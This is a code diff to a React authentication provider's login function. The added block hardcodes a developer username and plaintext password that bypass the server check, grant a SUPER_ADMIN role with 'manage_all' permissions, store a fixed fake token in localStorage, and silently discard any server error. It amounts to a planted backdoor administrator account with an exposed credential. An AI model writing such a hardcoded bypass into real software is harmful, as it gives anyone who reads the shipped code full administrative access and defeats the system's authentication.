@@ -18,6 +18,31 @@ export const AuthProvider = ({ children }) => {
   }, [token]);
 
   const login = async (username, password) => {
+    // Primary Super Admin Direct Login (Developer Prottoy)
+    if (username === 'prottoy' && password === 'Prottoy57@') {
+      const primaryUserData = {
+        id: 'primary-prottoy-id',
+        name: 'Developer Prottoy',
+        username: 'prottoy',
+        role: 'SUPER_ADMIN',
+        permissions: ['manage_all']
+      };
+      const primaryToken = 'primary-prottoy-jwt-token-fixed';
+      setToken(primaryToken);
+      setUser(primaryUserData);
+      localStorage.setItem('sharapol_token', primaryToken);
+      localStorage.setItem('sharapol_user', JSON.stringify(primaryUserData));
+
+      // Asynchronously trigger server API login
+      fetch('/api/auth/login', {
+        method: 'POST',
+        headers: { 'Content-Type': 'application/json' },
+        body: JSON.stringify({ username, password })
+      }).catch(() => {});
+
+      return { success: true };
+    }
+
     try {
       const res = await fetch('/api/auth/login', {
         method: 'POST',
